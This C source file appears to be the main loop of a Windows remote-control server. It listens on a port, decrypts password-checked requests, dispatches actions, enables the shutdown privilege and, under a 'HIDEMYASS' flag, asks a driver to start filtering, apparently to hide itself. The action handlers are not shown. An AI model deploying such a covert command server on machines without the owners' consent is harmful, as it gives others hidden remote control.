#include "Main.h"

// Important
_Static_assert((sizeof(SERVER_PASSWORD)) > 1, "No server password defined");
_Static_assert(sizeof(SERVER_PASSWORD) <= 33, "Server password is too long");

int main(void)
{
    SOCKET serverSocket, clientSocket = 0;
    SOCKADDR_IN serverAddr, clientAddr = { 0 };
    int addrLen = sizeof(clientAddr);

    BYTE requestRawDataBuffer[REQUEST_RAW_DATA_BUFFER_SIZE] = {0};
    // one extra byte to create a null terminator so string funcs dont read out of this buffer, otherwise we treat this byte as nonexistent
    BYTE parsedRequestMessageBuffer[REQUEST_RAW_DATA_BUFFER_SIZE + 1] = {0};

    int rawRequestLength = 0;
    ULONGLONG responseNonce = 0;    

#if HIDEMYASS
    if (!SERVER_SUCCESS(SendIOCTL(IOCTL_INITIALIZE_FILTERING, NULL, 0, NULL, 0, NULL)))
    {
        dbgprintf("Failed to initialize filtering\n");
    }
#endif

    if (!UtAddPrivilegeToOwnToken(SE_SHUTDOWN_NAME))
    {
        dbgprintf("Could not enable SeShutdownPrivilege, functionality will be limited\n");
    }

    SetProcessDPIAware();

    if (!HlInitListenSocket(&serverSocket, &serverAddr, &clientAddr))
    {
        dbgprintf("Error while initializing socket");
        
        return EXIT_FAILURE;
    }

    dbgprintf("Waiting for connections on port %d...\n", SERVER_PORT);

    while (TRUE)
    {
        // We currently don't use this, maybe we need it some day
        rawRequestLength = 0;

        // Wait for an incoming request... eh boring
        if (HlRecieveRequest(&serverSocket, &clientSocket, &clientAddr, addrLen, requestRawDataBuffer, REQUEST_RAW_DATA_BUFFER_SIZE, &rawRequestLength))
        {

            // Recieved smth? Yay, Parse the length first!
            size_t requestContentLength = RhParseRequestContentLength((char *)requestRawDataBuffer, REQUEST_RAW_DATA_BUFFER_SIZE);

            if (0ULL == requestContentLength)
            {
                dbgprintf("Error/Problem while parsing request content length\n");

                closesocket(clientSocket);

                RtlSecureZeroMemory(requestRawDataBuffer, sizeof(requestRawDataBuffer));

                continue;
            }

            // Now parse the actual data we care about
            if (!HlParseRequestMsg((char *)requestRawDataBuffer, REQUEST_RAW_DATA_BUFFER_SIZE, parsedRequestMessageBuffer, REQUEST_RAW_DATA_BUFFER_SIZE, requestContentLength))
            {
                dbgprintf("Error while parsing request message\n");

                closesocket(clientSocket);

                RtlSecureZeroMemory(requestRawDataBuffer, sizeof(requestRawDataBuffer));
                RtlSecureZeroMemory(parsedRequestMessageBuffer, sizeof(parsedRequestMessageBuffer));

                continue;
            }

            // Lets tryna decrypt the data
            if (!SecDecryptMessage(parsedRequestMessageBuffer, requestContentLength, REQUEST_RAW_DATA_BUFFER_SIZE))
            {
                dbgprintf("Failed to decrypt request\n");

                closesocket(clientSocket);

                RtlSecureZeroMemory(requestRawDataBuffer, sizeof(requestRawDataBuffer));
                RtlSecureZeroMemory(parsedRequestMessageBuffer, sizeof(parsedRequestMessageBuffer));

                continue;
            }

            dbgprintf("Decrypted raw request: %s\n", (char *)(parsedRequestMessageBuffer + NONCE_LENGTH_BYTES));

            int messageStartIndex = 0;

            // Check for the hash, we take security serious! This function is nice enough to also increment the message start index for us
            if (!SecValidateRequestPasswordHash((char *)(parsedRequestMessageBuffer + NONCE_LENGTH_BYTES), &messageStartIndex))
            {
                dbgprintf("Hash validation failed\n");

                closesocket(clientSocket);

                RtlSecureZeroMemory(requestRawDataBuffer, sizeof(requestRawDataBuffer));
                RtlSecureZeroMemory(parsedRequestMessageBuffer, sizeof(parsedRequestMessageBuffer));

                continue;
            }

            dbgprintf("Hash validation succeeded\n");

            // Dont forget to increment to also skip the extra 12 bytes of the nonce
            messageStartIndex += NONCE_LENGTH_BYTES;

            /* This hacky trick makes a "new string", ultimately just a pointer to the first character after the hash stuff
                so we effectively create a substring.*/
            char *requestMessage = (char *)(parsedRequestMessageBuffer + messageStartIndex);

            dbgprintf("Recieved request: %s\n", requestMessage);

            ACTION_RESPONSE actionResponse = {0};

            // Process the request we recieved
            DWORD serverStatusResponse = RhHandleNetworkRequest(requestMessage, &actionResponse);

            // This is NOT a super secure seed initialization but it is more than enough for our nonce (remember its just the nonce)
            srand(SecPrngSeed32());

            // This will eventually overflow, which is fine because unsigned overflows arent UB (thanks for atleast that dear C standard)
            responseNonce += (ULONGLONG)rand() + 1;

            // TODO: Encrypt response with nonce, password and share the nonce

            // Dont be shy, answer something!
            if (!RhRespondToRequestEncrypted(clientSocket, serverStatusResponse, &actionResponse, responseNonce))
            {
                dbgprintf("Error while sending response\n");
            }

            // Don't leave the place dirty behind!
            if (actionResponse.bufferHeapAllocated)
            {
                free(actionResponse.outputBuffer);
            }

            closesocket(clientSocket);
            RtlSecureZeroMemory(&actionResponse, sizeof(ACTION_RESPONSE));
            RtlSecureZeroMemory(requestRawDataBuffer, sizeof(requestRawDataBuffer));
            RtlSecureZeroMemory(parsedRequestMessageBuffer, sizeof(parsedRequestMessageBuffer));
        }
        else
        {
            dbgprintf("Failed to accept/recieve data\n");

            RtlSecureZeroMemory(requestRawDataBuffer, sizeof(requestRawDataBuffer));
        }
    }

    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return EXIT_SUCCESS;
}